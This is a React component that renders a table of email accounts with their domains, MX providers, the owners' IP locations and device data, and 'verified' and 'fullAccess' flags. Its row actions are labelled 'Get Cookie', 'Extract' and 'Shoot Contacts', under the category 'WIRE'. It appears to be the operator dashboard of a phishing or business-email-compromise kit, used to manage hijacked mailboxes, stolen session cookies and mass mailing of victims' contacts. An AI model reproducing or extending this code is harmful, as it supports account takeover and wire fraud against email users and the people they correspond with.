import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { 
  faCheck, 
  faCookie, 
  faFileExport,
  faPaperPlane,
  faStickyNote,
  faClock,
  faCopy,
  faGlobe,
  faLaptop
} from '@fortawesome/free-solid-svg-icons';
import { useState } from 'react';
import { TableActions } from '../TableActions';
import { DomainModal } from './DomainModal';
import { useWindowSize } from '../../../../hooks/useWindowSize';
import { getLogoUrl } from '../../../../utils/logoUtils';

interface WireTableProps {
  data: any[];
  onRowClick: (id: string) => void;
  selectedId: string | null;
  onVerify: (id: string) => void;
  onGetCookie: (id: string) => void;
  onCopy: (text: string) => void;
  onExtract: (id: string) => void;
  onShootContacts: (id: string) => void;
  onMemoSave: (id: string, text: string) => void;
  loading: boolean;
}

export const WireTable: React.FC<WireTableProps> = ({
  data,
  onRowClick,
  selectedId,
  onVerify,
  onGetCookie,
  onCopy,
  onExtract,
  onShootContacts,
  onMemoSave,
  loading
}) => {
  const [selectedDomain, setSelectedDomain] = useState<any>(null);
  const { width } = useWindowSize();

  const getColumns = () => {
    if (width < 768) { // Mobile
      return ['logo', 'email', 'actions'];
    } else if (width < 1024) { // Tablet/iPad
      return ['logo', 'timestamp', 'email', 'domain', 'actions'];
    }
    // Large Screen
    return ['logo', 'timestamp', 'email', 'domain', 'actions'];
  };

  const formatIpData = (ipDataStr: string) => {
    try {
      const data = JSON.parse(ipDataStr);
      return `${data.ip} (${data.city}, ${data.country})`;
    } catch (e) {
      return 'Invalid IP data';
    }
  };

  const formatDeviceData = (deviceDataStr: string) => {
    try {
      const data = JSON.parse(deviceDataStr);
      return `${data.browser} ${data.browserVersion} on ${data.os}`;
    } catch (e) {
      return 'Invalid device data';
    }
  };

  const handleCopy = (text: string, type: string) => {
    onCopy(text);
    // You could add a toast notification here
    console.log(`${type} copied to clipboard`);
  };

  const handleDomainClick = (e: React.MouseEvent, domain: string, mxRecord: any) => {
    e.stopPropagation();
    try {
      const mxData = typeof mxRecord === 'string' ? JSON.parse(mxRecord) : mxRecord;
      setSelectedDomain({
        domain,
        records: mxData.records || [],
        possibleProvider: mxData.possibleProvider || 'Unknown'
      });
    } catch (error) {
      console.error('Error parsing MX record:', error);
    }
  };

  const getRowBackgroundColor = (item: any) => {
    if (item.verified === 'TRUE' && item.fullAccess === 'TRUE') return 'bg-green-50 hover:bg-green-100 dark:bg-green-900 dark:hover:bg-green-800';
    if (item.verified === 'TRUE') return 'bg-amber-50 hover:bg-amber-100 dark:bg-amber-900 dark:hover:bg-amber-800';
    return 'bg-red-50 hover:bg-red-100 dark:bg-red-900 dark:hover:bg-red-800';
  };

  const columns = getColumns();

  return (
    <>
      <div className="overflow-x-auto">
        <table className="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
          <thead className="bg-gray-50 dark:bg-gray-700">
            <tr>
              {columns.map(column => (
                <th key={column} className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">
                  {column === 'actions' || column === 'logo' ? '' : column}
                </th>
              ))}
            </tr>
          </thead>
          <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
            {data.map((item) => (
              <tr 
                key={item.id}
                onClick={() => onRowClick(item.id)}
                className={`cursor-pointer ${getRowBackgroundColor(item)} ${selectedId === item.id ? '!bg-blue-50 dark:!bg-blue-900' : ''}`}
              >
                {columns.map(column => (
                  <td key={column} className="px-6 py-4 whitespace-nowrap text-sm text-gray-900 dark:text-gray-200">
                    {column === 'logo' ? (
                      <div 
                        onClick={(e) => {
                          e.stopPropagation();
                          handleDomainClick(e, item.domain, item.mxRecord);
                        }}
                        className="cursor-pointer"
                      >
                        <img 
                          src={getLogoUrl(item.domain, item.mxRecord)}
                          alt={`${item.domain} logo`}
                          className="h-8 w-8 object-contain"
                          onError={(e) => {
                            const target = e.target as HTMLImageElement;
                            target.style.display = 'none'; // Hide the broken image
                            const fallbackIcon = target.nextElementSibling as HTMLElement;
                            if (fallbackIcon) {
                              fallbackIcon.style.display = 'block'; // Show the fallback icon
                            }
                          }}
                        />
                        {/* Fallback icon */}
                        <FontAwesomeIcon 
                          icon={faGlobe} 
                          className="h-8 w-8 text-gray-400" 
                          style={{ display: 'none' }} // Initially hidden
                        />
                      </div>
                    ) : column === 'actions' ? (
                      <div className="flex items-center justify-end space-x-2">
                        {width >= 768 && (
                          <>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                handleCopy(item.ipData, 'IP Data');
                              }}
                              className="text-gray-400 dark:text-gray-300 hover:text-gray-600 dark:hover:text-gray-100"
                              title="Copy IP Data"
                            >
                              <FontAwesomeIcon icon={faGlobe} />
                            </button>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                handleCopy(item.deviceData, 'Device Data');
                              }}
                              className="text-gray-400 dark:text-gray-300 hover:text-gray-600 dark:hover:text-gray-100"
                              title="Copy Device Data"
                            >
                              <FontAwesomeIcon icon={faLaptop} />
                            </button>
                          </>
                        )}
                        <TableActions
                          item={item}
                          onVerify={onVerify}
                          onGetCookie={onGetCookie}
                          onExtract={onExtract}
                          onShootContacts={onShootContacts}
                          onMemoSave={onMemoSave}
                          loading={loading}
                          category="WIRE"
                        />
                      </div>
                    ) : column === 'domain' ? (
                      <a
                        href="#"
                        onClick={(e) => handleDomainClick(e, item.domain, item.mxRecord)}
                        className="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300"
                      >
                        {item[column]}
                      </a>
                    ) : column === 'timestamp' ? (
                      new Date(item[column]).toLocaleString()
                    ) : column === 'ipData' ? (
                      formatIpData(item[column])
                    ) : column === 'deviceData' ? (
                      formatDeviceData(item[column])
                    ) : (
                      item[column]
                    )}
                  </td>
                ))}
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {selectedDomain && (
        <DomainModal
          isOpen={!!selectedDomain}
          onClose={() => setSelectedDomain(null)}
          domainData={selectedDomain}
        />
      )}
    </>
  );
};
